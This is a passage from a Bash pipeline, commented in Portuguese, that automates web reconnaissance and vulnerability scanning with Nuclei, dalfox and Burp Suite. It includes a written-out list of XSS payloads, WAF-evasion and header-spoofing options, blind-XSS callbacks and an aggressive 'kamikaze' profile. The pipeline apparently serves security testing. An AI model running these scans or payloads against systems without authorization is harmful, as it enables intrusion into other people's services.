TOTAL_URLS=$(safe_count urls/all_urls_raw.txt)
PARAM_URLS=$(safe_count urls/with_params.txt)
JS_FILES=$(safe_count js/js_urls_raw.txt)
API_ENDPOINTS=$(safe_count apis/api_endpoints.txt)

send_notification "✅ *FASE 4 COMPLETA*
🔗 $TOTAL_URLS URLs coletadas
🎯 $PARAM_URLS com parâmetros
📜 $JS_FILES arquivos JavaScript
🔌 $API_ENDPOINTS endpoints de API"

# ============= DOWNLOAD DE ARQUIVOS JS CORRIGIDO =============
download_js_files() {
    if [[ "$SAVE_JS" = true ]] && [[ -s js/js_urls_raw.txt ]]; then
        log_info "Baixando arquivos JS com timeout e fallback..."

        mkdir -p js/downloads logs
        : > logs/js_download_errors.log
        local downloaded=0
        local max_files="${MAX_JS_FILES}"
        local timeout_per_file="${TIMEOUT_PER_CALL}"

        # Detectar downloaders disponíveis (ordem de preferência: aria2c, wget, curl)
        local candidates=()
        if command -v aria2c >/dev/null 2>&1; then candidates+=("aria2c"); fi
        if command -v wget >/dev/null 2>&1; then candidates+=("wget"); fi
        if command -v curl >/dev/null 2>&1; then candidates+=("curl"); fi
        if [[ ${#candidates[@]} -eq 0 ]]; then
            log_error "Nenhum downloader disponível (aria2c/wget/curl)"
            return 1
        fi

        log_info "Downloaders disponíveis: ${candidates[*]} (ordem de fallback)"

        while IFS= read -r line || [[ -n "$line" ]]; do
            [[ $downloaded -ge $max_files ]] && break
            # Sanitizar URL (remover CR e espaços)
            js_url="${line//$'\r'/}"
            js_url="$(echo "$js_url" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
            [[ -z "$js_url" ]] && continue

            # Nome seguro para arquivo
            safe_name=$(echo "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-80)
            outfile="js/downloads/js_${downloaded}_${safe_name}.js"

            log_info "[JS $((downloaded+1))/$max_files] Baixando: $js_url"

            local success=false
            for dl in "${candidates[@]}"; do
                tmp_err="$(mktemp)"
                case "$dl" in
                    aria2c)
                        if timeout "$timeout_per_file" aria2c -x 1 -s 1 --max-connection-per-server=1 --timeout=25 -q -o "$outfile" "$js_url" 2>"$tmp_err"; then
                            exit_code=0
                        else
                            exit_code=$?
                        fi
                        ;;
                    wget)
                        if timeout "$timeout_per_file" wget --timeout=25 --tries=1 --user-agent="$USER_AGENT" -q -O "$outfile" "$js_url" 2>"$tmp_err"; then
                            exit_code=0
                        else
                            exit_code=$?
                        fi
                        ;;
                    curl)
                        if timeout "$timeout_per_file" curl -sS -L -f -m 25 --connect-timeout 10 -A "$USER_AGENT" -o "$outfile" "$js_url" 2>"$tmp_err"; then
                            exit_code=0
                        else
                            exit_code=$?
                        fi
                        ;;
                esac
                if [[ $exit_code -eq 0 && -s "$outfile" ]]; then
                    success=true
                    rm -f "$tmp_err"
                    break
                else
                    err_snip="$(tail -n 2 "$tmp_err" | tr '\n' ' ')"
                    echo "[$(date '+%H:%M:%S')] downloader=$dl url=$js_url exit=$exit_code error=${err_snip}" >> logs/js_download_errors.log
                    rm -f "$outfile" 2>/dev/null || true
                    rm -f "$tmp_err"
                fi
            done

            if [[ "$success" = true ]]; then
                downloaded=$((downloaded + 1))
            fi

            # Pequena pausa para evitar sobrecarga
            sleep 0.1
        done < js/js_urls_raw.txt

        # Contar arquivos baixados com sucesso (não vazios)
        JS_DOWNLOADED=$(find js/downloads -type f -name "*.js" -size +0c 2>/dev/null | wc -l | tr -d ' ')
        total_files=$(find js/downloads -type f -name "*.js" 2>/dev/null | wc -l | tr -d ' ')
        
        # Limpar arquivos vazios
        find js/downloads -type f -empty -delete 2>/dev/null || true
        
        log_info "Download completo: $JS_DOWNLOADED/$total_files arquivos JS válidos"
        
        # Log de estatísticas
        if [[ -s logs/js_download_errors.log ]]; then
            errors=$(wc -l < logs/js_download_errors.log)
            log_info "Erros de download: $errors (veja logs/js_download_errors.log)"
        fi
    fi
}

if [[ "$DRY_RUN" = "false" ]]; then
    download_js_files
else
    log_info "DRY-RUN: Pulando download de arquivos JS"
fi

# Garantir que JS_DOWNLOADED tenha valor padrão se não foi definido
JS_DOWNLOADED=${JS_DOWNLOADED:-0}

echo "========== FASE 5: VULNERABILITY SCANNING =========="
send_notification "🎯 *NUCLEI VULNERABILITY SCAN*  
Iniciando varredura de vulnerabilidades..."

# Função nuclei_scanning com flags otimizadas
#!/bin/bash

# ----------------------------------------------------
TEMPLATE_TIMEOUT=45
nuclei_scanning() {
    if ! command -v nuclei >/dev/null 2>&1; then
        log_info "nuclei não encontrado — pulando etapa de varredura"
        return
    fi

    # Atualizar templates do nuclei primeiro (CRÍTICO)
    log_info "📦 Atualizando templates do Nuclei (melhorias críticas)..."
    if nuclei -update-templates -silent 2>&1 | tee logs/nuclei_update.log; then
        log_success "✅ Templates atualizados com sucesso"
    else
        log_warn "⚠️ Falha ao atualizar templates - usando versão existente"
    fi
    
    # CORREÇÃO: Não pré-verificar templates - executar direto e fazer fallback se falhar
    log_info "🚀 Iniciando Nuclei (confiando na detecção automática de templates)..."
    
    # Função auxiliar para executar nuclei com fallback automático
    run_nuclei_with_fallback() {
        local cmd="$1"
        local output_file="$2"
        local log_file="$3"
        
        # Primeira tentativa: executar o comando diretamente
        if eval "$cmd" 2>&1 | tee "$log_file"; then
            return 0
        fi
        
        # Se falhou com erro de templates, tentar atualizar e rodar novamente
        if grep -qi "no templates\|template.*not found\|failed to load" "$log_file" 2>/dev/null; then
            log_warn "⚠️  Nuclei reportou problema com templates - atualizando..."
            if timeout 300 nuclei -ut -silent 2>&1 | tee logs/nuclei_update_fallback.log; then
                log_success "✅ Templates atualizados - retentando scan..."
                if eval "$cmd" 2>&1 | tee "${log_file%.log}_retry.log"; then
                    return 0
                fi
            fi
            log_error "❌ Scan falhou mesmo após atualização de templates"
            return 1
        fi
        
        # Outros erros (não relacionados a templates)
        log_warn "⚠️  Nuclei retornou erro (não relacionado a templates)"
        return 1
    }
    
    # Verificar se DAST é suportado (flag -dast)
    local has_dast=false
    if nuclei -help 2>&1 | grep -q "\-dast"; then
        has_dast=true
        log_success "✅ DAST mode suportado"
    else
        log_warn "⚠️  DAST não disponível - usando templates de fuzzing padrão"
    fi
    
    # Argumentos base que podem ser usados em todas as etapas
    build_nuclei_args NUCLEI_ARGS
    
    # --- ETAPA 1: FAST MODE TURBINADO BRUTAL COM MÁXIMO DE FLAGS ---
    log_info "🔥 Executando nuclei FAST mode BRUTAL (todas vulnerabilidades críticas)..."
    
    # USAR TODOS OS ALVOS (subdomínios + hosts vivos)
    local target_file="alive/all_targets_with_protocol.txt"
    if [[ ! -s "$target_file" ]]; then
        log_warn "⚠️  Arquivo de alvos consolidados não encontrado, usando alive/hosts.txt"
        target_file="alive/hosts.txt"
    fi
    
    if [[ -s "$target_file" ]]; then
        log_info "📊 Alvos encontrados: $(wc -l < "$target_file")"
        local reduced_concurrency=$(( $CONCURRENCY / 2 ))
        [[ $reduced_concurrency -lt 5 ]] && reduced_concurrency=5
        
        # MÁXIMO DE FLAGS PARA DESCOBERTA TOTAL
        if timeout 2h nuclei -l "$target_file" \
            -tags cve,exposure,token,takeover,default-login,sqli,xss,rce,lfi,ssrf,xxe,idor,ssti,injection,auth-bypass \
            -severity critical,high,medium \
            -stats \
            -rl "$RATE_LIMIT" -c "$reduced_concurrency" -timeout "$TEMPLATE_TIMEOUT" \
            -etags dos,fuzz,intrusive \
            -passive \
            -headless \
            -code \
            -follow-redirects \
            -follow-host-redirects \
            -max-redirects 5 \
            -system-resolvers \
            -project \
            -project-path nuclei/project_hosts_fast \
            -stream \
            -store-resp \
            -store-resp-dir nuclei/responses_fast \
            -o nuclei/nuclei_hosts_fast.txt 2>&1 | tee logs/nuclei_fast_errors.log; then
            log_success "✅ Nuclei hosts fast scan completo"
        else
            log_warn "⚠️  Nuclei falhou, tentando com tags específicas..."
            # Fallback 1: Usar tags CVE (sintaxe moderna - sem path hardcoded)
            timeout 2h nuclei -l "$target_file" \
                -tags cve \
                -severity critical,high \
                -stats \
                -rl "$RATE_LIMIT" -c "$reduced_concurrency" -timeout "$TEMPLATE_TIMEOUT" \
                -passive -follow-redirects \
                -o nuclei/nuclei_hosts_fast.txt 2>&1 | tee logs/nuclei_fast_fallback.log || {
                    log_warn "⚠️  Fallback 1 falhou, tentando modo minimalista..."
                    # Fallback 2: Modo minimalista com tags básicas
                    timeout 1h nuclei -l "$target_file" \
                        -tags exposure,misconfig \
                        -severity critical,high \
                        -c 10 \
                        -o nuclei/nuclei_hosts_fast.txt 2>&1 | tee logs/nuclei_fast_minimal.log || true
                }
        fi
    else
        log_info "⚠️  Arquivo alive/hosts.txt vazio ou não encontrado"
    fi
    
    if [[ -s urls/all_urls_raw.txt ]]; then
        log_info "📊 URLs encontradas: $(wc -l < urls/all_urls_raw.txt)"
        local reduced_concurrency=$(( $CONCURRENCY / 2 ))
        [[ $reduced_concurrency -lt 5 ]] && reduced_concurrency=5
        
        # MODO AGRESSIVO BRUTAL - TODAS AS FLAGS + MAIS TAGS
        if timeout 3h nuclei -l urls/all_urls_raw.txt \
            -tags cve,exposure,token,takeover,default-login,sqli,xss,rce,lfi,ssrf,xxe,idor,ssti,injection,auth-bypass,redirect,oast,dns,http,network,file \
            -severity critical,high,medium,low \
            -stats \
            -rl "$RATE_LIMIT" -c "$reduced_concurrency" -timeout "$TEMPLATE_TIMEOUT" \
            -etags dos \
            -headless \
            -code \
            -follow-redirects \
            -follow-host-redirects \
            -max-redirects 10 \
            -system-resolvers \
            -project \
            -project-path nuclei/project_urls_fast \
            -stream \
            -store-resp \
            -store-resp-dir nuclei/responses_urls_fast \
            -debug-req \
            -debug-resp \
            -o nuclei/nuclei_urls_fast.txt 2>&1 | tee logs/nuclei_fast_urls_errors.log; then
            log_success "✅ Nuclei URLs fast scan completo"
        else
            log_warn "⚠️  Nuclei URLs falhou, tentando fallback..."
            timeout 1h nuclei -l urls/all_urls_raw.txt \
                -tags xss,sqli,lfi \
                -severity critical,high \
                -c 10 -passive -follow-redirects \
                -o nuclei/nuclei_urls_fast.txt 2>&1 | tee logs/nuclei_fast_urls_fallback.log || true
        fi
    else
        log_info "⚠️  Arquivo urls/all_urls_raw.txt vazio ou não encontrado"
    fi

    # --- ETAPA 2: EXTENDED MODE COMPLETO E BRUTAL COM MÁXIMO DE FLAGS ---
    log_info "🔥 Executando nuclei EXTENDED mode BRUTAL (cobertura total)..."
    
    # USAR TODOS OS ALVOS (subdomínios + hosts vivos)
    local target_file="alive/all_targets_with_protocol.txt"
    if [[ ! -s "$target_file" ]]; then
        target_file="alive/hosts.txt"
    fi
    
    if [[ -s "$target_file" ]]; then
        local reduced_concurrency=$(( $CONCURRENCY / 2 ))
        [[ $reduced_concurrency -lt 5 ]] && reduced_concurrency=5
        
        timeout 5h nuclei -l "$target_file" \
            -tags misconfig,panel,default-login,exposure,tech,iot,network,disclosure,token,backup,config,logs,secrets,keys,api,cms,edb,cnvd,cisa,kev \
            -severity critical,high,medium,low,info \
            -stats \
            -rl "$RATE_LIMIT" -c "$reduced_concurrency" -timeout "$TEMPLATE_TIMEOUT" \
            -etags dos \
            -headless \
            -code \
            -follow-redirects \
            -follow-host-redirects \
            -max-redirects 10 \
            -system-resolvers \
            -project \
            -project-path nuclei/project_hosts_ext \
            -stream \
            -store-resp \
            -store-resp-dir nuclei/responses_ext \
            -debug-req \
            -debug-resp \
            -env-vars \
            -o nuclei/nuclei_hosts_ext.txt 2>&1 | tee logs/nuclei_ext_errors.log || true
    else
        log_info "⚠️  Arquivo alive/hosts.txt vazio ou não encontrado"
    fi

    # --- ETAPA 3: MODO FUZZING & WORKFLOWS BRUTAL COM VERIFICAÇÃO ---
    log_info "🔥 Executando Nuclei - MODO FUZZING & WORKFLOWS BRUTAL..."
    
    # USAR TODOS OS ALVOS (subdomínios + hosts vivos)
    local target_file="alive/all_targets_with_protocol.txt"
    if [[ ! -s "$target_file" ]]; then
        target_file="alive/hosts.txt"
    fi
    
    if [[ -s "$target_file" ]]; then
        local reduced_concurrency=$(( $CONCURRENCY / 3 ))
        [[ $reduced_concurrency -lt 5 ]] && reduced_concurrency=5
        
        # CORREÇÃO: Tentar DAST primeiro, com múltiplos fallbacks
        local dast_success=false
        
        if [[ "$has_dast" = true ]]; then
            log_info "✅ Usando DAST templates com MÁXIMO DE FLAGS..."
            if timeout 8h nuclei -l "$target_file" \
                -dast \
                -tags fuzz,fuzzing,workflows,payloads \
                -severity critical,high,medium,low,info \
                -stats \
                -rl "$RATE_LIMIT" -c "$reduced_concurrency" -timeout "$TEMPLATE_TIMEOUT" \
                -etags dos,intrusive \
                -passive \
                -headless \
                -code \
                -follow-redirects \
                -follow-host-redirects \
                -max-redirects 5 \
                -system-resolvers \
                -project \
                -project-path nuclei/project_dast \
                -stream \
                -store-resp \
                -store-resp-dir nuclei/responses_dast \
                -o nuclei/nuclei_fuzzing_workflows.txt 2>&1 | tee logs/nuclei_fuzz_errors.log; then
                log_success "✅ DAST scan completo"
                dast_success=true
            else
                log_warn "⚠️  DAST scan falhou, tentando fallback..."
            fi
        fi
        
        # Fallback 1: Usar tags de fuzzing (sintaxe moderna - sem path hardcoded)
        if [[ "$dast_success" = false ]]; then
            log_info "🔄 Fallback 1: Usando tags de fuzzing e workflows..."
            if timeout 6h nuclei -l "$target_file" \
                -tags fuzzing,workflows,fuzz \
                -severity critical,high,medium,low \
                -stats \
                -rl "$RATE_LIMIT" -c "$reduced_concurrency" -timeout "$TEMPLATE_TIMEOUT" \
                -passive -headless -code \
                -follow-redirects \
                -store-resp -store-resp-dir nuclei/responses_fuzz \
                -o nuclei/nuclei_fuzzing_workflows.txt 2>&1 | tee logs/nuclei_fuzz_fallback.log; then
                log_success "✅ Fuzzing tags scan completo"
                dast_success=true
            fi
        fi
        
        # Fallback 2: Usar tags de fuzzing genéricas
        if [[ "$dast_success" = false ]]; then
            log_info "🔄 Fallback 2: Usando tags de fuzzing genéricas..."
            if timeout 4h nuclei -l "$target_file" \
                -tags fuzzing,file,lfi,rce,cmdi,path-traversal \
                -severity critical,high,medium \
                -stats \
                -rl "$RATE_LIMIT" -c "$reduced_concurrency" -timeout "$TEMPLATE_TIMEOUT" \
                -passive -follow-redirects \
                -o nuclei/nuclei_fuzzing_workflows.txt 2>&1 | tee logs/nuclei_fuzz_minimal.log; then
                log_success "✅ Fuzzing tags scan completo"
                dast_success=true
            fi
        fi
        
        # Se tudo falhou, criar arquivo vazio e avisar
        if [[ "$dast_success" = false ]]; then
            log_warn "⚠️  Todos os métodos de fuzzing falharam - criando arquivo vazio"
            touch nuclei/nuclei_fuzzing_workflows.txt
        fi
    else
        log_info "⚠️  Arquivo alive/hosts.txt vazio ou não encontrado"
        touch nuclei/nuclei_fuzzing_workflows.txt
    fi
    
    # --- ETAPA 4: SCAN AVANÇADO DE JAVASCRIPT/DOM BRUTAL COM MÁXIMO DE FLAGS ---
    log_info "🔥 Executando nuclei DOM/JavaScript focused scan BRUTAL..."
    
    # USAR TODOS OS ALVOS (subdomínios + hosts vivos)
    local target_file="alive/all_targets_with_protocol.txt"
    if [[ ! -s "$target_file" ]]; then
        target_file="alive/hosts.txt"
    fi
    
    if [[ -s "$target_file" ]]; then
        local reduced_concurrency=$(( $CONCURRENCY / 2 ))
        [[ $reduced_concurrency -lt 5 ]] && reduced_concurrency=5
        
        timeout 3h nuclei -l "$target_file" \
            -tags javascript,dom,xss,prototype-pollution,client-side,browser \
            -severity critical,high,medium,low,info \
            -stats \
            -rl "$RATE_LIMIT" -c "$reduced_concurrency" -timeout "$TEMPLATE_TIMEOUT" \
            -etags dos \
            -passive \
            -headless \
            -code \
            -follow-redirects \
            -follow-host-redirects \
            -max-redirects 5 \
            -system-resolvers \
            -project \
            -project-path nuclei/project_js \
            -stream \
            -store-resp \
            -store-resp-dir nuclei/responses_js \
            -o nuclei/nuclei_dom_js.txt 2>&1 | tee logs/nuclei_js_errors.log || true
    else
        log_info "⚠️  Arquivo alive/hosts.txt vazio ou não encontrado"
    fi
    
    # Estatísticas finais
    local total_findings=0
    for file in nuclei/nuclei_*.txt; do
        if [[ -s "$file" ]]; then
            local count=$(wc -l < "$file" 2>/dev/null || echo 0)
            total_findings=$((total_findings + count))
        fi
    done
    
    log_success "✅ Análise BRUTAL completa do Nuclei finalizada - $total_findings findings totais"
}

# Função xss_testing com dalfox BRUTAL + payloads customizados
#!/bin/bash

# --- CONFIGURAÇÕES BRUTAIS PARA O DALFOX ---
# Blind XSS URL (use environment variable - no hardcoded URLs)
BLIND_XSS_URL="${BLIND_XSS_URL:-}"
CUSTOM_PAYLOADS_FILE="${CUSTOM_PAYLOADS_FILE:-}"

# Criar arquivo de payloads customizados se não existir
if [[ -z "$CUSTOM_PAYLOADS_FILE" ]]; then
    CUSTOM_PAYLOADS_FILE="nuclei/xss_testing/custom_xss_payloads.txt"
    mkdir -p nuclei/xss_testing
    cat > "$CUSTOM_PAYLOADS_FILE" <<'XSSPAYLOADS'
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<iframe src="javascript:alert(document.domain)">
<body onload=alert(document.domain)>
<input onfocus=alert(document.domain) autofocus>
<select onfocus=alert(document.domain) autofocus>
<textarea onfocus=alert(document.domain) autofocus>
<keygen onfocus=alert(document.domain) autofocus>
<video><source onerror="alert(document.domain)">
<audio src=x onerror=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
'><script>alert(document.domain)</script>
"><script>alert(document.domain)</script>
</script><script>alert(document.domain)</script>
;alert(document.domain)//
'-alert(document.domain)-'
"-alert(document.domain)-"
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
XSSPAYLOADS
fi
# ---------------------------------------------------

xss_testing() {
    if command -v dalfox >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
        log_info "Executando dalfox XSS testing BRUTAL com payloads customizados..."
        
        mkdir -p nuclei/xss_testing logs/xss
        
        # --- ETAPA 1: Teste BRUTAL em URLs com Parâmetros ---
        log_info "[BRUTAL] Etapa 1: Testando TODOS os parâmetros com payloads customizados..."
        timeout 90m cat urls/with_params.txt | dalfox pipe \
            -w "$CONCURRENCY" \
            --timeout 15 \
            --mining-dom \
            --mining-dict \
            --deep-domxss \
            --follow-redirects \
            --method GET,POST \
            --waf-evasion \
            --custom-payload "$CUSTOM_PAYLOADS_FILE" \
            -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 dalfox-scan" \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "X-Originating-IP: 127.0.0.1" \
            -H "Accept: */*" \
            --only-poc \
            --format json \
            -o nuclei/dalfox_json.txt 2>logs/xss/dalfox_pipe_errors.log || true
            
        # Extrair POCs em formato legível
        if [[ -s nuclei/dalfox_json.txt ]]; then
            cat nuclei/dalfox_json.txt | jq -r '.poc' 2>/dev/null > nuclei/dalfox_pocs.txt || true
        fi
        
        # --- ETAPA 2: Teste BRUTAL com Blind XSS e DOM ---
        log_info "[BRUTAL] Etapa 2: Teste profundo Blind e DOM XSS..."
        if [[ -s urls/gf_xss.txt ]]; then
            timeout 60m cat urls/gf_xss.txt | dalfox pipe \
                -w "$CONCURRENCY" \
                --blind "$BLIND_XSS_URL" \
                --deep-domxss \
                --mining-dict \
                --mining-dom \
                --skip-bav \
                --multicast \
                --custom-payload "$CUSTOM_PAYLOADS_FILE" \
                --waf-evasion \
                --follow-redirects \
                -o nuclei/dalfox_results.txt 2>logs/xss/dalfox_file_errors.log || true
        fi
        
        # --- ETAPA 3: Modo URL único BRUTAL ---
        log_info "[BRUTAL] Etapa 3: Teste individual de URLs críticas..."
        if [[ -s urls/with_params.txt ]]; then
            head -10 urls/with_params.txt | while read -r url; do
                safe=$(echo "$url" | md5sum | cut -c1-8)
                timeout 180s dalfox url "$url" \
                    -b "$BLIND_XSS_URL" \
                    --custom-payload "$CUSTOM_PAYLOADS_FILE" \
                    --waf-evasion \
                    --mining-dom \
                    --mining-dict \
                    --deep-domxss \
                    --follow-redirects \
                    -w 100 \
                    -o nuclei/xss_testing/dalfox_${safe}.txt 2>/dev/null || true
            done
        fi
        
        log_info "✅ Dalfox XSS BRUTAL testing completo"
    fi

    # Burp Suite Pro Scanner Integration (se disponível)
    run_burp_scanner
}

# ============= BURP SUITE PRO - PROXY INTEGRATION (NÃO CLI) =============
run_burp_scanner() {
    log_section "BURP SUITE PROXY INTEGRATION"
    
    # Verificar se existe uma instância do Burp Suite rodando com proxy
    BURP_PROXY_HOST="${BURP_PROXY_HOST:-127.0.0.1}"
    BURP_PROXY_PORT="${BURP_PROXY_PORT:-8080}"
    BURP_FORCE="${BURP_FORCE:-false}"  # Variável para forçar envio mesmo sem detecção
    
    log_info "🔍 Verificando Burp Suite Proxy em $BURP_PROXY_HOST:$BURP_PROXY_PORT..."
    
    # Verificar arquivo de URLs primeiro
    if [[ ! -f urls/with_params.txt ]]; then
        log_warn "⚠️  Arquivo urls/with_params.txt não encontrado"
        log_info "💡 Tentando usar urls/parameterized.txt como alternativa..."
        
        if [[ -f urls/parameterized.txt ]]; then
            cp urls/parameterized.txt urls/with_params.txt
        elif [[ -f urls/katana.txt ]]; then
            log_info "💡 Usando urls/katana.txt como fallback..."
            grep -E '\?' urls/katana.txt > urls/with_params.txt 2>/dev/null || touch urls/with_params.txt
        else
            log_warn "⚠️  Nenhum arquivo de URLs disponível para Burp Scanner"
            return 0
        fi
    fi
    
    if [[ ! -s urls/with_params.txt ]]; then
        log_warn "⚠️  Arquivo urls/with_params.txt está vazio"
        log_info "📊 Total de URLs disponíveis: $(wc -l < urls/with_params.txt 2>/dev/null || echo 0)"
        return 0
    fi
    
    local url_count=$(wc -l < urls/with_params.txt)
    log_info "📋 URLs parametrizadas disponíveis: $url_count"
    
    # Testar conexão com proxy do Burp (múltiplas tentativas)
    local proxy_detected=false
    log_info "🔌 Testando conexão com Burp Proxy..."
    
    # Tentativa 1: /dev/tcp
    if timeout 3 bash -c "echo > /dev/tcp/$BURP_PROXY_HOST/$BURP_PROXY_PORT" 2>/dev/null; then
        proxy_detected=true
        log_success "✅ Burp Proxy detectado via /dev/tcp"
    fi
    
    # Tentativa 2: netcat
    if [[ "$proxy_detected" = false ]] && command -v nc >/dev/null 2>&1; then
        if timeout 3 nc -z "$BURP_PROXY_HOST" "$BURP_PROXY_PORT" 2>/dev/null; then
            proxy_detected=true
            log_success "✅ Burp Proxy detectado via netcat"
        fi
    fi
    
    # Tentativa 3: curl
    if [[ "$proxy_detected" = false ]] && command -v curl >/dev/null 2>&1; then
        if timeout 3 curl -x "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" -s -o /dev/null http://example.com 2>/dev/null; then
            proxy_detected=true
            log_success "✅ Burp Proxy detectado via curl"
        fi
    fi
    
    if [[ "$proxy_detected" = false ]] && [[ "$BURP_FORCE" != "true" ]]; then
        log_warn "⚠️  Burp Suite Proxy não detectado em $BURP_PROXY_HOST:$BURP_PROXY_PORT"
        log_info ""
        log_info "📖 INSTRUÇÕES PARA CONFIGURAR BURP SUITE:"
        log_info "   1. Abra o Burp Suite Pro"
        log_info "   2. Vá em: Proxy > Options > Proxy Listeners"
        log_info "   3. Certifique-se que há um listener em 127.0.0.1:8080 (Running)"
        log_info "   4. Vá em: Scanner > Live scanning"
        log_info "   5. Ative: 'Live audit from Proxy (all traffic)'"
        log_info ""
        log_info "💡 Para forçar envio sem detecção, use: export BURP_FORCE=true"
        log_info "💡 Para mudar porta, use: export BURP_PROXY_PORT=8081"
        return 0
    fi
    
    if [[ "$BURP_FORCE" = "true" ]]; then
        log_warn "⚠️  Modo FORÇADO ativado - enviando mesmo sem detecção de proxy"
    fi
    
    log_success "🔥 Burp Suite Proxy detectado! Iniciando integração..."
    log_info "🎯 Certifique-se que 'Live Active Scanning' está ATIVO no Burp Suite Pro"
    log_info "📍 Scanner > Live scanning > Live audit from Proxy (all traffic)"
    
    mkdir -p nuclei/burp_scan logs/burp
    
    log_info "📝 Criando script Python para proxy..."
    
    # Criar script Python para enviar requests via Burp Proxy
    cat > nuclei/burp_scan/burp_proxy_sender.py <<BURPPYTHON
#!/usr/bin/env python3
import sys
import requests
from urllib.parse import urlparse, parse_qs
import time

# Desabilitar warnings de SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configurar proxy do Burp
proxies = {
    'http': 'http://${BURP_PROXY_HOST}:${BURP_PROXY_PORT}',
    'https': 'http://${BURP_PROXY_HOST}:${BURP_PROXY_PORT}'
}

# Headers realistas
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'DNT': '1',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

def send_to_burp(url):
    """Envia requisição através do proxy do Burp para scanning"""
    print(f"[*] Processando: {url}")
    success = False
    
    try:
        # GET request
        print(f"[*] Enviando GET request...")
        r = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=30, allow_redirects=True)
        print(f"[+] GET {url} - Status: {r.status_code}")
        success = True
        
        # Se tiver parâmetros, também testar POST
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            # Converter para dict simples
            post_data = {k: v[0] for k, v in params.items()}
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            print(f"[*] Enviando POST request com {len(post_data)} parâmetros...")
            r_post = requests.post(base_url, data=post_data, headers=headers, proxies=proxies, verify=False, timeout=30)
            print(f"[+] POST {base_url} - Status: {r_post.status_code}")
        
        time.sleep(0.5)  # Rate limiting suave
        return True
        
    except requests.exceptions.ProxyError as e:
        print(f"[!] Erro de proxy: {e}", file=sys.stderr)
        print(f"[!] Verifique se Burp Suite está rodando em {proxies['http']}", file=sys.stderr)
        return False
    except requests.exceptions.Timeout:
        print(f"[-] Timeout ao processar {url}", file=sys.stderr)
        return False
    except Exception as e:
        print(f"[-] Erro ao processar {url}: {type(e).__name__}: {e}", file=sys.stderr)
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: burp_proxy_sender.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    result = send_to_burp(url)
    sys.exit(0 if result else 1)
BURPPYTHON
    
    chmod +x nuclei/burp_scan/burp_proxy_sender.py
    log_success "✅ Script Python criado"
    
    # Determinar quantidade de URLs baseado no perfil
    local max_urls=50
    [[ "$PROFILE" = "light" ]] && max_urls=20
    [[ "$PROFILE" = "balanced" ]] && max_urls=50
    [[ "$PROFILE" = "aggressive" ]] && max_urls=100
    [[ "$PROFILE" = "kamikaze" ]] && max_urls=200
    
    # Limitar ao máximo disponível
    local available_urls=$(wc -l < urls/with_params.txt)
    [[ $available_urls -lt $max_urls ]] && max_urls=$available_urls
    
    log_info "📡 Enviando $max_urls URLs para Burp Suite via proxy..."
    log_info "⏰ Isso pode demorar - o Burp está fazendo scan ativo em background!"
    log_info ""
    
    local count=0
    local success_count=0
    local error_count=0
    
    head -n "$max_urls" urls/with_params.txt | while read -r url; do
        count=$((count + 1))
        
        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "🎯 [$count/$max_urls] Processando URL:"
        echo "    $url"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        
        # Enviar via proxy usando Python (com logs detalhados)
        if timeout 45s python3 nuclei/burp_scan/burp_proxy_sender.py "$url" 2>>logs/burp/proxy_errors.log; then
            echo "✅ Sucesso - request enviada para Burp"
            success_count=$((success_count + 1))
        else
            echo "❌ Falha ao enviar - veja logs/burp/proxy_errors.log"
            error_count=$((error_count + 1))
            
            # Fallback: tentar com curl
            echo "🔄 Tentando fallback com curl..."
            if timeout 20s curl -x "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
                -k -s -L -v \
                -A "Mozilla/5.0 BurpScanner" \
                "$url" >/dev/null 2>&1; then
                echo "✅ Curl fallback bem-sucedido"
            else
                echo "❌ Curl fallback também falhou"
            fi
        fi
        
        # Pequena pausa entre requests
        sleep 1
    done
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    log_success "✅ Envio completo para Burp Suite Proxy"
    log_info "📊 Estatísticas:"
    log_info "   • Total processado: $max_urls URLs"
    log_info "   • Sucessos: $success_count"
    log_info "   • Falhas: $error_count"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    
    log_info "📊 PRÓXIMOS PASSOS - Verifique no Burp Suite:"
    log_info "   1. Target > Site map - para ver todas as requests capturadas"
    log_info "   2. Proxy > HTTP history - para ver histórico de tráfego"
    log_info "   3. Scanner > Issue activity - para ver vulnerabilidades detectadas"
    log_info "   4. Scanner > Scan queue - para ver progresso dos scans ativos"
    log_info ""
    log_info "💡 DICAS:"
    log_info "   • Deixe o Burp Suite rodando para completar os scans ativos"
    log_info "   • Use: Target > Site map > Issues para ver vulnerabilidades por host"
    log_info "   • Use: Scanner > Export issues para exportar resultados"
    log_info "   • Erros detalhados em: logs/burp/proxy_errors.log"
    
    # Salvar resumo
    cat > nuclei/burp_scan/scan_summary.txt <<EOF
Burp Suite Proxy Integration - Scan Summary
============================================
Data: $(date)
